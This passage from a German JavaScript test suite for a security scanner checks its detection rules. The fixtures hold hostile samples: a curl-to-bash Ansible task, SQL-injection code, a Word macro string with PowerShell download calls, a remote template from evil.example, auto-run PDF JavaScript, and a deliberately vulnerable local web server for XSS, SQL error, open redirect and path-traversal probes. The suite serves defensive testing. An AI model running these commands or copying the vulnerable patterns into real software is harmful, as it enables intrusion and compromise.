    const ans = U('playbook.yml', '- hosts: web\n  tasks:\n    - name: install\n      shell: curl https://x.sh | bash\n    - name: set db password\n      mysql_user: password=abc\n');
    const aid = runIac([ans]).map((f) => f.ruleId);
    check('iac: Ansible – curl|bash und Passwort ohne no_log', aid.includes('ansible-curl-pipe-sh') && aid.includes('ansible-secret-logged'));
    check('lizenz: GPL in MIT-Projekt ist Konflikt, AGPL hoch', conflict('GPL-3.0', 'MIT').severity === 'medium' && conflict('AGPL-3.0', 'MIT').severity === 'high');
    check('lizenz: MIT OR GPL ist kein Konflikt, LGPL auch nicht', !conflict('MIT OR GPL-3.0', 'MIT') && !conflict('LGPL-2.1', 'MIT'));
    check('lizenz: GPL in GPL-Projekt ok', !conflict('GPL-3.0', 'GPL-3.0'));
    const pj = U('app/package.json', JSON.stringify({ name: 'a', license: 'MIT', dependencies: { foo: '1', bar: '1' } }));
    const lock = U('app/package-lock.json', JSON.stringify({ packages: { '': {}, 'node_modules/foo': { version: '1.0.0', license: 'AGPL-3.0' }, 'node_modules/bar': { version: '2.0.0', license: 'MIT' }, 'node_modules/baz': { version: '1.0.0' } } }));
    const lic = runLicense([pj, lock]);
    check('lizenz: AGPL-Paket gemeldet, MIT nicht, fehlende Lizenz gesammelt', lic.some((f) => f.ruleId === 'license-copyleft' && /foo/.test(f.title) && f.severity === 'high') && !lic.some((f) => /„bar“/.test(f.title)) && lic.some((f) => f.ruleId === 'license-unknown' && f.category === 'License'));
    const langs = runLangs([
      U('srv/db.go', 'package x\nimport "fmt"\nfunc q(id string){ db.Query(fmt.Sprintf("SELECT * FROM u WHERE id=%s", id)) }\nvar c = &tls.Config{InsecureSkipVerify: true}\n'),
      U('web/index.php', '<?php echo $_GET["name"]; mysqli_query($c, "SELECT * FROM u WHERE id=" . $_GET["id"]);'),
      U('App/Data.cs', 'var cmd = new SqlCommand("SELECT * FROM u WHERE n=\'" + name + "\'", con);\nvar f = new BinaryFormatter();'),
      U('app/Main.kt', 'db.rawQuery("SELECT * FROM u WHERE id=" + id, null)'),
      U('ios/Info.plist', '<key>NSAllowsArbitraryLoads</key>\n<true/>'),
      U('src/main.rs', 'let c = Client::builder().danger_accept_invalid_certs(true).build();'),
    ]).map((f) => f.ruleId);
    check('sprachen: Go, PHP, C#, Kotlin, Swift/iOS, Rust', ['go-sql-concat', 'go-insecure-tls', 'php-xss-echo', 'php-sql-concat', 'cs-sql-concat', 'cs-binaryformatter', 'kt-sql-concat', 'ios-ats-disabled', 'rust-insecure-tls'].every((x) => langs.includes(x)));
    const log = '@@C abc1234def|Mia|2025-03-01\ndiff --git a/.env b/.env\n+++ b/.env\n+AWS_KEY=AKIAABCDEFGHIJKLMNOP\n@@C 999|Mia|2025-03-02\n+++ /dev/null\n';
    const hits = scanLog(log);
    check('git-historie: alter AWS-Schlüssel mit Datei und Commit', hits.length === 1 && hits[0].file === '.env' && hits[0].commit.hash === 'abc1234def');
  }

  // --- Handy-Apps und System-Pruefungen ---
  {
    const { decodeAxml, decodeBplist, runMobile } = require('../src/core/modules/mobile');
    const h = require('../src/core/hostaudit');
    // Minimales binaeres AndroidManifest (UTF-16-Stringpool, zwei Elemente) zusammenbauen
    const strs = ['manifest', 'application', 'debuggable', 'usesCleartextTraffic', 'activity', 'exported', 'name', '.AdminActivity'];
    const enc = strs.map((s) => { const b = Buffer.alloc(2 + s.length * 2 + 2); b.writeUInt16LE(s.length, 0); b.write(s, 2, 'utf16le'); return b; });
    const offs = []; let o = 0; for (const e of enc) { offs.push(o); o += e.length; }
    const poolData = Buffer.concat(enc); const pad = (4 - (poolData.length % 4)) % 4;
    const poolHdr = Buffer.alloc(28 + strs.length * 4);
    poolHdr.writeUInt16LE(0x0001, 0); poolHdr.writeUInt16LE(28, 2); poolHdr.writeUInt32LE(strs.length, 8); poolHdr.writeUInt32LE(0, 16); poolHdr.writeUInt32LE(28 + strs.length * 4, 20);
    offs.forEach((x, i) => poolHdr.writeUInt32LE(x, 28 + i * 4));
    const pool = Buffer.concat([poolHdr, poolData, Buffer.alloc(pad)]); pool.writeUInt32LE(pool.length, 4);
    const el = (name, attrs) => { const b = Buffer.alloc(36 + attrs.length * 20); b.writeUInt16LE(0x0102, 0); b.writeUInt16LE(16, 2); b.writeUInt32LE(b.length, 4); b.writeInt32LE(-1, 16); b.writeUInt32LE(name, 20); b.writeUInt16LE(20, 24); b.writeUInt16LE(20, 26); b.writeUInt16LE(attrs.length, 28);
      attrs.forEach(([n, val, str], i) => { const a = 36 + i * 20; b.writeInt32LE(-1, a); b.writeUInt32LE(n, a + 4); b.writeInt32LE(str ?? -1, a + 8); b.writeUInt16LE(8, a + 12); b[a + 15] = str != null ? 0x03 : 0x12; b.writeUInt32LE(str ?? (val ? 0xffffffff : 0), a + 16); }); return b; };
    const end = (name) => { const b = Buffer.alloc(24); b.writeUInt16LE(0x0103, 0); b.writeUInt16LE(16, 2); b.writeUInt32LE(24, 4); b.writeInt32LE(-1, 16); b.writeUInt32LE(name, 20); return b; };
    const body = Buffer.concat([pool, el(0, []), el(1, [[2, true], [3, true]]), el(4, [[6, 0, 7], [5, true]]), end(4), end(1), end(0)]);
    const head = Buffer.alloc(8); head.writeUInt16LE(0x0003, 0); head.writeUInt16LE(8, 2); head.writeUInt32LE(8 + body.length, 4);
    const xml = decodeAxml(Buffer.concat([head, body]));
    check('mobil: binäres Android-Manifest wird lesbar', /<application android:debuggable="true" android:usesCleartextTraffic="true">/.test(xml || '') && /android:name="\.AdminActivity"/.test(xml));
    const mids = runMobile([{ label: 'app.apk!/AndroidManifest.xml', content: xml }]).map((f) => f.ruleId);
    check('mobil: Debug, Klartext und offener Bildschirm erkannt', ['android-debuggable', 'android-cleartext', 'android-exported-component'].every((x) => mids.includes(x)));
    // bplist00: { NSAppTransportSecurity: true }
    const bp = Buffer.concat([Buffer.from('bplist00'), Buffer.from([0xd1, 0x01, 0x02]), Buffer.from([0x56]), Buffer.from('UIFile'), Buffer.from([0x09])]);
    const offsTable = Buffer.from([8, 11, 18]);
    const trailer = Buffer.alloc(32); trailer[6] = 1; trailer[7] = 1; trailer.writeBigUInt64BE(3n, 8); trailer.writeBigUInt64BE(0n, 16); trailer.writeBigUInt64BE(BigInt(bp.length), 24);
    check('mobil: binäre Info.plist wird lesbar', /<key>UIFile<\/key>\s*<true\/>/.test(decodeBplist(Buffer.concat([bp, offsTable, trailer])) || ''));
    const w = h.parseWindows({ defender: { av: true, rt: false }, firewall: [{ name: 'Public', enabled: false }, { name: 'Private', enabled: true }], bitlocker: 2, lastUpdateDays: 120, uac: 1, rdpDeny: 0, rdpNla: 0, smb1: true, guest: false }).map((f) => f.ruleId);
    check('windows: Virenschutz, Firewall, BitLocker, Updates, RDP, SMBv1', ['win-defender-off', 'win-firewall-off', 'win-bitlocker-off', 'win-updates-old', 'win-rdp-no-nla', 'win-smb1'].every((x) => w.includes(x)) && !w.includes('win-uac-off'));
    check('windows: sauberer PC ohne Befund', h.parseWindows({ defender: { av: true, rt: true, age: 1, tamper: true }, firewall: [{ name: 'Public', enabled: true }], bitlocker: 1, lastUpdateDays: 10, uac: 1, rdpDeny: 1, smb1: false, guest: false }).length === 0);
    const d = h.parseDocker([{ Name: '/db', Config: { User: '' }, HostConfig: { Privileged: true, PortBindings: { '5432/tcp': [{ HostIp: '', HostPort: '5432' }] } }, Mounts: [{ Source: '/var/run/docker.sock' }] }]).map((f) => f.ruleId);
    check('docker: privilegiert, Socket, offener DB-Port, root', ['container-privileged', 'container-docker-sock', 'container-db-port-public', 'container-root-user'].every((x) => d.includes(x)));
    const aws = h.parseAws({ summary: { SummaryMap: { AccountMFAEnabled: 0, AccountAccessKeysPresent: 0 } }, passwordPolicy: null, buckets: [{ name: 'b1', isPublic: true }], groups: [{ GroupId: 'sg-1', GroupName: 'web', IpPermissions: [{ IpProtocol: 'tcp', FromPort: 3389, ToPort: 3389, IpRanges: [{ CidrIp: '0.0.0.0/0' }] }] }] }).map((f) => f.ruleId);
    check('aws: root ohne MFA, keine Passwortregel, offener Bucket, RDP offen', ['aws-root-no-mfa', 'aws-no-password-policy', 'cloud-bucket-public', 'cloud-firewall-open'].every((x) => aws.includes(x)));
    const az = h.parseAzure({ storage: [{ name: 's1', allowBlobPublicAccess: true, minimumTlsVersion: 'TLS1_0' }], nsgs: [{ name: 'n', securityRules: [{ name: 'ssh', direction: 'Inbound', access: 'Allow', sourceAddressPrefix: '*', destinationPortRange: '22' }] }] }).map((f) => f.ruleId);
    check('azure: öffentlicher Speicher, altes TLS, SSH offen', ['cloud-bucket-public', 'iac-azure-old-tls', 'cloud-firewall-open'].every((x) => az.includes(x)));
    const gcp = h.parseGcp({ buckets: [{ name: 'g', public: true }], firewalls: [{ name: 'f', direction: 'INGRESS', sourceRanges: ['0.0.0.0/0'], allowed: [{ IPProtocol: 'tcp', ports: ['20-25'] }] }] }).map((f) => f.ruleId);
    check('gcp: öffentlicher Bucket, Firewall offen', gcp.includes('cloud-bucket-public') && gcp.includes('cloud-firewall-open'));
    const { TargetSchema } = require('../src/core/validation');
    check('system: nur bekannte System-Prüfungen erlaubt', !!TargetSchema && TargetSchema.safeParse({ type: 'system', value: 'windows' }).success && !TargetSchema.safeParse({ type: 'system', value: 'rm -rf' }).success);
  }

  // --- KI: nur Geaendertes, Vorsortierung, zwei Modelle, Fehlalarme lernen, Prompt-Cache ---
  {
    const http = require('http');
    const { analyze, consensus } = require('../src/core/analyze');
    let calls = [];
    const srv = http.createServer((req, res) => {
      let body = ''; req.on('data', (d) => { body += d; }); req.on('end', () => {
        const j = JSON.parse(body); calls.push(j);
        const sys = j.messages[0].content, user = j.messages[1].content;
        let content;
        if (/sortierst Quelltext/.test(sys)) content = JSON.stringify({ suspicious: ['proj/db.js'] });
        else content = JSON.stringify({ findings: /db\.js/.test(user) ? [{ title: 'SQL-Injection in getUser', severity: 'high', category: 'Injection', location: 'proj/db.js:2', description: 'x', remediation: 'y', confidence: 'medium' }] : [] });
        res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify({ message: { content }, prompt_eval_count: 100, eval_count: 20 }));
      });
    });
    await new Promise((r) => srv.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${srv.address().port}`;
    const mem = {}; const cache = { get: (k) => mem[k], set: (k, v) => { mem[k] = v; } };
    const units = [{ label: 'proj/db.js', kind: 'file', language: 'javascript', content: 'const q = "SELECT * FROM u WHERE id=" + req.query.id;\ndb.query(q);' }, { label: 'proj/style.js', kind: 'file', language: 'javascript', content: 'export const color = "red";' }];
    const cfg = { provider: 'ollama', model: 'big', baseUrl: base, analysisDepth: 'standard', aiValidation: false, aiCache: cache };
    const r1 = await analyze({ units, config: cfg });
    const n1 = calls.length;
    check('ki-cache: erster Lauf fragt die KI', n1 >= 1 && r1.findings.some((f) => /SQL-Injection/.test(f.title)));
    const r2 = await analyze({ units, config: cfg });
    check('ki-cache: unveränderter zweiter Lauf ohne KI-Aufruf, gleicher Befund', calls.length === n1 && r2.meta.fromCache === 2 && r2.findings.some((f) => /SQL-Injection/.test(f.title)));
    const changed = [{ ...units[0], content: units[0].content + '\n// geändert' }, units[1]];
    await analyze({ units: changed, config: cfg });
    const sent = calls.slice(n1).map((c) => c.messages[1].content).join('\n');
    check('ki-cache: nur die geänderte Datei geht erneut an die KI', /db\.js/.test(sent) && !/style\.js/.test(sent));
    calls = [];
    const r3 = await analyze({ units, config: { ...cfg, aiCache: null, triageModel: 'tiny' } });
    const mainSent = calls.filter((c) => c.model === 'big').map((c) => c.messages[1].content).join('\n');
    check('vorsortierung: kleines Modell siebt unauffällige Datei aus', calls.some((c) => c.model === 'tiny') && /db\.js/.test(mainSent) && !/style\.js/.test(mainSent) && r3.meta.skippedByTriage === 1);
    calls = [];
    const r4 = await analyze({ units, config: { ...cfg, aiCache: null, consensusModel: 'second' } });
    check('zwei modelle: beide gefragt, gemeinsamer Fund gilt als sicher', calls.some((c) => c.model === 'second') && r4.findings.some((f) => f.consensus === 'both' && f.confidence === 'high'));
    srv.close();
    const mixed = consensus([{ location: 'a.js:10', category: 'XSS', confidence: 'high' }], [{ location: 'a.js:12', category: 'XSS', confidence: 'medium' }, { location: 'b.js:1', category: 'Auth', confidence: 'high' }], ['A', 'B']);
    check('zwei modelle: Einzelfund wird heruntergestuft', mixed.length === 2 && mixed[0].consensus === 'both' && mixed[1].consensus === 'only:B' && mixed[1].confidence === 'medium');
    const st = require('../src/core/store');
    const db = st.emptyStore();
    const tg = [{ type: 'path', value: 'C:/p' }];
    const first = st.applyRun(db, { targets: tg, findings: [{ ruleId: 'sql-injection-in-getuser', title: 'SQL-Injection in getUser', location: 'p/db.js:2', category: 'Injection', severity: 'high', source: 'ai' }], scannersRun: [] });
    st.setStatus(db, first.findings[0].id, 'FALSE_POSITIVE');
    const again = st.applyRun(db, { targets: tg, findings: [{ ruleId: 'sql-injection-in-getuser', title: 'SQL-Injection in getUser', location: 'p/db.js:7', category: 'Injection', severity: 'high', source: 'ai' }], scannersRun: [] });
    check('fehlalarm lernen: gleicher Befund an anderer Zeile bleibt ausgeblendet', again.findings[0].status === 'FALSE_POSITIVE' && again.findings[0].suppressed && again.counters.learned === 1);
    check('fehlalarm lernen: Hinweisliste für die KI', st.falsePositivesFor(db, [first.findings[0].targetId]).length >= 1);
    const { estimateCost } = require('../src/core/cost');
    const full = estimateCost({ provider: 'anthropic', model: 'claude-sonnet-5', inputTokens: 1e6, outputTokens: 0 });
    const cached = estimateCost({ provider: 'anthropic', model: 'claude-sonnet-5', inputTokens: 1e6, outputTokens: 0, cachedTokens: 9e5 });
    check('prompt-cache: zwischengespeicherte Tokens kosten nur einen Bruchteil', cached.usd < full.usd * 0.25 && cached.savedUsd > 0);
  }

  // --- Jede Kern-Datei laesst sich laden (faengt Syntaxfehler in Dateien ohne eigenen Test) ---
  {
    const fs = require('fs'); const path = require('path');
    const dirs = ['../src/core', '../src/core/modules'];
    const bad = [];
    for (const d of dirs) for (const f of fs.readdirSync(path.join(__dirname, d)).filter((x) => x.endsWith('.js'))) { try { require(path.join(__dirname, d, f)); } catch (e) { bad.push(`${f}: ${e.message}`); } }
    check('laden: alle Kern-Module ohne Fehler' + (bad.length ? ' – ' + bad.join('; ') : ''), bad.length === 0);
  }

  // --- Erreichbarkeit verwundbarer Pakete und Datenfluesse ueber Dateien ---
  {
    const { applyReachability } = require('../src/core/reach');
    const { analyzeTaint } = require('../src/core/taint');
    const U = (label, content) => ({ label, content, kind: 'file' });
    const units = [
      U('app/package.json', JSON.stringify({ dependencies: { lodash: '4.17.15', minimist: '1.2.0', axios: '0.21.0' } })),
      U('app/src/index.js', "const _ = require('lodash');\nimport axios from 'axios';\n_.merge(a, b);\n"),
    ];
    const dep = (name, extra = {}) => ({ title: `Verwundbare Abhaengigkeit: ${name}`, category: 'Dependencies', severity: 'high', contextualRiskScore: 80, package: { ecosystem: 'npm', name, version: '1' }, reachability: '', ...extra });
    const r = applyReachability([dep('lodash', { vulnSymbols: ['template'] }), dep('minimist'), dep('kind-of'), dep('axios'), dep('lodash', { vulnSymbols: ['merge'] })], units);
    check('erreichbar: Paket genutzt, betroffene Funktion nicht → heruntergestuft', r[0].reach === 'function-unused' && r[0].severity === 'medium' && r[0].contextualRiskScore === 40);
    check('erreichbar: direkte Abhängigkeit ohne Import → ungenutzt', r[1].reach === 'unused' && r[1].severity === 'medium');
    check('erreichbar: nur indirekt enthalten', r[2].reach === 'transitive' && r[2].severity === 'high');
    check('erreichbar: genutzt bleibt hoch, betroffene Funktion aufgerufen → sicher', r[3].reach === 'used' && r[3].severity === 'high' && r[4].reach === 'function-used' && r[4].confidence === 'high');
    check('erreichbar: aktiv ausgenutzte Lücke wird nie abgewertet', applyReachability([dep('minimist', { inCisaKev: true })], units)[0].severity === 'high');
    const flow = analyzeTaint([
      U('srv/db.js', 'function findUser(id) {\n  return db.query("SELECT * FROM users WHERE id = " + id);\n}\nmodule.exports = { findUser };'),
      U('srv/service.js', 'function loadProfile(userId) {\n  return findUser(userId);\n}'),
      U('srv/routes.js', "app.get('/u', (req, res) => {\n  loadProfile(req.query.id);\n});"),
    ]);
    check('datenfluss: Eingabe über drei Dateien bis in den SQL-Befehl', flow.length === 1 && flow[0].ruleId === 'taint-sql' && /routes\.js/.test(flow[0].description) && /service\.js:loadProfile/.test(flow[0].description) && flow[0].location === 'srv/db.js:2');
    const safe = analyzeTaint([
      U('srv/db.js', 'function findUser(id) {\n  return db.query("SELECT * FROM users WHERE id = ?", [id]);\n}'),
      U('srv/routes.js', "app.get('/u', (req, res) => { findUser(req.query.id); });"),
    ]);
    check('datenfluss: Platzhalter im SQL → keine Meldung', safe.length === 0);
  }

  // --- Einordnung (CWE/OWASP), Normen-Nachweise, Kurzbericht ---
  {
    const { applyTaxonomy, complianceReport } = require('../src/core/taxonomy');
    const rep = require('../src/core/report');
    const fs0 = [
      { ruleId: 'php-sql-concat', category: 'Injection', severity: 'critical', title: 'Eingabe landet direkt im SQL-Befehl (PHP)', location: 'a.php:1', impact: 'Datenbank auslesbar.', steps: ['Prepared Statements verwenden.'] },
      { ruleId: 'CVE-2022-23529', category: 'Dependencies', severity: 'high', title: 'Verwundbare Abhaengigkeit: jsonwebtoken', location: 'npm' },
      { ruleId: 'missing-hsts', category: 'Transport', severity: 'low', title: 'HSTS fehlt', location: 'https://x' },
    ];
    const t = applyTaxonomy(fs0);
    check('einordnung: SQL → CWE-89 / OWASP A03, Paket → A06, HSTS → A02', t[0].cwe === 'CWE-89' && t[0].owasp === 'A03' && t[1].owasp === 'A06' && t[2].owasp === 'A02');
    const comp = complianceReport(t);
    const iso = comp.find((c) => c.key === 'iso27001');
    check('normen: ISO A.8.28 dringend, A.8.8 offen, Lizenz-Kontrolle grün', iso.controls.find((c) => c.id === 'A.8.28').status === 'fail' && iso.controls.find((c) => c.id === 'A.8.8').status === 'fail' && iso.controls.find((c) => c.id === 'A.5.32').status === 'ok');
    check('normen: Kataloge ISO 27001, BSI, NIS2, DSGVO, CRA, SOC 2, PCI DSS, ASVS, HIPAA', comp.map((c) => c.key).join() === 'iso27001,bsi,nis2,dsgvo,cra,soc2,pcidss,asvs,hipaa');
    const html = rep.toHtml({ findings: t, summary: { total: 3, counts: { critical: 1, high: 1, medium: 0, low: 1, info: 0 } }, meta: {}, errors: [] });
    check('bericht: CWE, OWASP und Normen-Kapitel enthalten', /CWE-89/.test(html) && /A03:2021/.test(html) && /Nachweise für Normen/.test(html));
    const ex = rep.toExecutive({ findings: t, meta: { at: '2026-11-02T10:00:00Z' } }, { company: 'Muster GmbH', logoDataUrl: 'data:image/png;base64,AAAA', trend: [{ open: 9 }, { open: 5 }, { open: 3 }] });
    check('kurzbericht: Firma, Logo, Note, Risiken, Schritte, Verlauf', /Muster GmbH/.test(ex) && /<img src="data:image\/png/.test(ex) && /Sicherheitswert/.test(ex) && /Prepared Statements/.test(ex) && /<polyline/.test(ex));
    check('kurzbericht: fremdes Logo-Format wird nicht eingebettet', !/<img/.test(rep.toExecutive({ findings: [] }, { logoDataUrl: 'javascript:alert(1)' })));
    const sarif = JSON.parse(rep.toSarif({ findings: t }));
    check('sarif: CWE- und OWASP-Tags', sarif.runs[0].results[0].properties.tags.includes('CWE-89') && sarif.runs[0].results[0].properties.tags.includes('OWASP-A03'));
  }

  // --- Trefferquote am Uebungsprojekt (nur Regeln) darf nicht sinken ---
  {
    const path = require('path');
    const { ingestTargets } = require('../src/core/ingest');
    const { runStaticModules } = require('../src/core/modules/static');
    const { scoreBench } = require('../src/core/bench');
    const exp = require('../bench/expected.json');
    const ing = await ingestTargets([{ type: 'path', value: path.join(__dirname, '..', 'bench', exp.project) }]);
    const pre = prescan(ing.units, {});
    const s = scoreBench(dedupeFindings([...pre.findings, ...runStaticModules(ing.units).findings]), exp);
    check(`bench: Regeln finden ${s.found}/${s.total}, Genauigkeit ${Math.round(s.precision * 100)} %`, s.recall >= 0.95 && s.precision >= 0.85);
  }

  // --- Schadsoftware, Dokumente, Webseiten-Durchgang, Proben, Login ---
  {
    const fs = require('fs'); const os = require('os'); const path = require('path');
    const AdmZip = require('adm-zip');
    const { analyzeDocument } = require('../src/core/docaudit');
    const { parseDefender, parseSignatures, hashLookup } = require('../src/core/malware');
    const z = new AdmZip(); z.addFile('word/document.xml', Buffer.from('<w:document/>')); z.addFile('word/vbaProject.bin', Buffer.from('Attribute VB_Name AutoOpen Shell powershell URLDownloadToFile'));
    const docm = analyzeDocument(z.toBuffer(), 'rechnung.docx');
    check('dokument: Makro mit verdächtigen Befehlen, getarnte Endung', docm.some((f) => f.ruleId === 'doc-macro-suspicious' && f.severity === 'high') && docm.some((f) => f.ruleId === 'doc-macro-wrong-extension'));
    const z2 = new AdmZip(); z2.addFile('word/document.xml', Buffer.from('<w:document/>')); z2.addFile('word/_rels/settings.xml.rels', Buffer.from('<Relationship Type="http://x/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>'));
    check('dokument: Vorlage aus dem Internet erkannt', analyzeDocument(z2.toBuffer(), 'a.docx').some((f) => f.ruleId === 'doc-remote-template'));
    const pdf = Buffer.from('%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >> endobj 2 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj');
    check('dokument: PDF mit JavaScript beim Öffnen', analyzeDocument(pdf, 'x.pdf').some((f) => f.ruleId === 'pdf-active-suspicious'));
    check('dokument: harmloses PDF ohne Befund', analyzeDocument(Buffer.from('%PDF-1.7\n1 0 obj << /Type /Page >> endobj'), 'ok.pdf').length === 0);
    const dout = 'Scan starting...\r\nScan finished.\r\nScanning C:\\x found 1 threats.\r\n\r\nThreat                  : Trojan:Win32/Wacatac.B!ml\r\nResources               : 1 total\r\n    file                : C:\\x\\setup.exe\r\n';
    const th = parseDefender(dout);
    check('defender: Bedrohung und Datei aus der Ausgabe gelesen', th.length === 1 && th[0].name === 'Trojan:Win32/Wacatac.B!ml' && /setup\.exe$/.test(th[0].file));
    const sig = parseSignatures([{ p: 'C:\\x\\a.exe', s: 'HashMismatch', n: 'CN=Firma' }, { p: 'C:\\x\\b.exe', s: 'NotSigned' }, { p: 'C:\\x\\c.dll', s: 'Valid' }], 'C:\\x');
    check('signatur: manipuliert = kritisch, unsigniert gesammelt, gültig still', sig.some((f) => f.ruleId === 'binary-signature-tampered' && f.severity === 'critical') && sig.some((f) => f.ruleId === 'binary-unsigned') && sig.length === 2);
    const tmpExe = path.join(os.tmpdir(), `vigil-test-${Date.now()}.exe`); fs.writeFileSync(tmpExe, 'MZ test');
    const hl = await hashLookup([{ file: tmpExe, size: 7 }], os.tmpdir(), { key: 'k', fetchImpl: async (u, o) => ({ json: async () => (/query=get_info&hash=[0-9a-f]{64}$/.test(o.body) && o.headers['Auth-Key'] === 'k' ? { query_status: 'ok', data: [{ signature: 'AgentTesla' }] } : { query_status: 'no_results' }) }) });
    fs.unlinkSync(tmpExe);
    check('malwarebazaar: nur Fingerabdruck gesendet, Treffer gemeldet', hl.findings.length === 1 && /AgentTesla/.test(hl.findings[0].title));
    check('malwarebazaar: ohne Schlüssel übersprungen', /übersprungen/.test((await hashLookup([{ file: 'x', size: 1 }], '.', {})).notes[0]));

    // Absichtlich unsichere Test-Webseite
    const http = require('http');
    const sessions = new Map();
    const site = http.createServer((req, res) => {
      const u = new URL(req.url, 'http://x');
      const sid = ((req.headers.cookie || '').match(/sid=(\w+)/) || [])[1];
      const html = (b, h = {}) => { res.writeHead(200, { 'Content-Type': 'text/html', ...h }); res.end(`<html><body>${b}</body></html>`); };
      let body = ''; req.on('data', (d) => { body += d; }); req.on('end', () => {
        if (u.pathname === '/') return html('<a href="/search?q=hallo">Suche</a> <a href="/item?id=1">Artikel</a> <a href="/go?next=/">Weiter</a> <a href="/view?file=a.txt">Datei</a> <a href="/login">Login</a> <form method="post" action="/newsletter"><input name="mail"><input type="password" name="pw"></form>');
        if (u.pathname === '/search') return html(`Ergebnisse für ${u.searchParams.get('q')}`);
        if (u.pathname === '/item') return /'/.test(u.searchParams.get('id')) ? html('Fehler: You have an error in your SQL syntax near') : html('Artikel 1');
        if (u.pathname === '/go') { res.writeHead(302, { Location: u.searchParams.get('next') }); return res.end(); }
        if (u.pathname === '/view') return /passwd/.test(u.searchParams.get('file')) ? html('root:x:0:0:root:/root:/bin/bash') : html('Datei-Inhalt');
        if (u.pathname === '/login' && req.method === 'GET') { const id = sid || Math.random().toString(36).slice(2, 10); if (!sessions.has(id)) sessions.set(id, null); return html('<form method="post" action="/login"><input name="email"><input type="password" name="password"></form>', sid ? {} : { 'Set-Cookie': `sid=${id}; Path=/` }); }
        if (u.pathname === '/login' && req.method === 'POST') {
          const p = new URLSearchParams(body);
          if (p.get('email') === 'test@example.org' && p.get('password') === 'Geheim1') { sessions.set(sid, 'test'); res.writeHead(302, { Location: '/konto' }); return res.end(); }
          return html(p.get('email') === 'test@example.org' ? 'Falsches Passwort.' : 'Dieses Konto gibt es nicht, bitte registrieren Sie sich zuerst.');
        }
        if (u.pathname === '/konto') return sessions.get(sid) ? html('Willkommen im Konto <a href="/profil?tab=1">Profil</a> <a href="/logout">Abmelden</a> <form method="post" action="/email"><input name="email"></form>') : html('<form><input type="password" name="password"></form>');
        if (u.pathname === '/profil') return sessions.get(sid) ? html(`Profil ${u.searchParams.get('tab')}`) : html('<input type="password">');
        if (u.pathname === '/logout') { res.writeHead(302, { Location: '/', 'Set-Cookie': 'sid=; Max-Age=0' }); return res.end(); }
        res.writeHead(404); res.end('nein');
      });
    });
    await new Promise((r) => site.listen(0, '127.0.0.1', r));
    const baseUrl = `http://127.0.0.1:${site.address().port}/`;
    const { runDeepWeb } = require('../src/core/modules/webdeep');
    const shallow = await runDeepWeb(baseUrl, { deep: false, rps: 200 });
    check('web: Durchgang findet Passwort über HTTP; ohne Nachweis keine Proben', shallow.findings.some((f) => f.ruleId === 'form-password-http') && !shallow.findings.some((f) => /^probe-/.test(f.ruleId)) && /nur für nachgewiesene/.test(shallow.notes.join(' ')));
    const deepRun = await runDeepWeb(baseUrl, { deep: true, rps: 200, login: { loginUrl: baseUrl + 'login', username: 'test@example.org', password: 'Geheim1' } });
    const ids = deepRun.findings.map((f) => f.ruleId);
    check('proben: XSS, SQL-Fehler, offene Weiterleitung, Path Traversal', ['probe-xss-reflected', 'probe-sql-error', 'probe-open-redirect', 'probe-path-traversal'].every((x) => ids.includes(x)));
    check('login: Session Fixation, Cookie-Schutz, Konto-Verrat, Abmelden', /erfolgreich/.test(deepRun.notes.join(' ')) && ['login-session-fixation', 'login-session-cookie-flags', 'login-user-enumeration', 'login-logout-not-invalidated'].every((x) => ids.includes(x)));
    check('login: angemeldeter Bereich – Formular ohne CSRF-Schutz', deepRun.findings.some((f) => f.ruleId === 'form-no-csrf' && /angemeldeten/.test(f.title)));
    const bad = await runDeepWeb(baseUrl, { deep: true, rps: 200, login: { loginUrl: baseUrl + 'login', username: 'test@example.org', password: 'falsch' } });
    check('login: falsches Testpasswort wird gemeldet, nicht als Befund', /nicht geklappt/.test(bad.notes.join(' ')) && !bad.findings.some((f) => f.ruleId === 'login-session-fixation'));
    if (ids.length < 9) console.log('    Hinweise:', deepRun.notes.join(' | '), '| IDs:', ids.join(','));
    site.close();
  }

  // --- Uebersicht: Befunde, Ziele und Laeufe loeschen ---
  {
    const st = require('../src/core/store');
    const db = st.emptyStore();
    const tg = [{ type: 'path', value: 'C:/a' }];
    const tg2 = [{ type: 'path', value: 'C:/b' }];
    const r1 = st.applyRun(db, { targets: tg, findings: [{ ruleId: 'x1', title: 'A', location: 'a/1.js:1', category: 'Other', severity: 'high', source: 'prescan' }, { ruleId: 'x2', title: 'B', location: 'a/2.js:1', category: 'Other', severity: 'low', source: 'prescan' }], scannersRun: [] });
    st.applyRun(db, { targets: tg2, findings: [{ ruleId: 'y', title: 'C', location: 'b/1.js:1', category: 'Other', severity: 'low', source: 'prescan' }], scannersRun: [] });
    st.addRun(db, { id: 'run-aaaaaaaa', status: 'COMPLETED', targets: tg, targetIds: [st.targetIdOf(tg[0])] });
    const d = st.deleteFindings(db, [r1.findings[0].id, 'gibt-es-nicht']);
    check('löschen: einzelner Befund entfernt, unbekannte ID ignoriert', d.deleted === 1 && Object.keys(db.findings).length === 2);
    const t = st.deleteTarget(db, st.targetIdOf(tg[0]));
    check('löschen: Ziel mit seinen Befunden, andere bleiben', t.ok && t.deletedFindings === 1 && Object.keys(db.findings).length === 1 && !db.targets[st.targetIdOf(tg[0])] && !!db.targets[st.targetIdOf(tg2[0])]);
    st.addRun(db, { id: 'run-bbbbbbbb', status: 'RUNNING', targets: [] });
    check('löschen: Lauf entfernt, laufender Lauf geschützt', st.deleteRun(db, 'run-aaaaaaaa').ok && !db.runs.some((r) => r.id === 'run-aaaaaaaa') && !st.deleteRun(db, 'run-bbbbbbbb').ok);
    const rid = Object.keys(db.findings)[0];
    st.setStatus(db, rid, 'RESOLVED');
    check('aufräumen: behobene Befunde löschen', st.purgeResolved(db).deleted === 1 && Object.keys(db.findings).length === 0);
  }

  // --- Tagesaktuelle Erkennungsdaten (Feeds) ---
  {
    const fs = require('fs'); const os = require('os'); const path = require('path');
    const feeds = require('../src/core/feeds');
    const fscan = require('../src/core/feedscan');
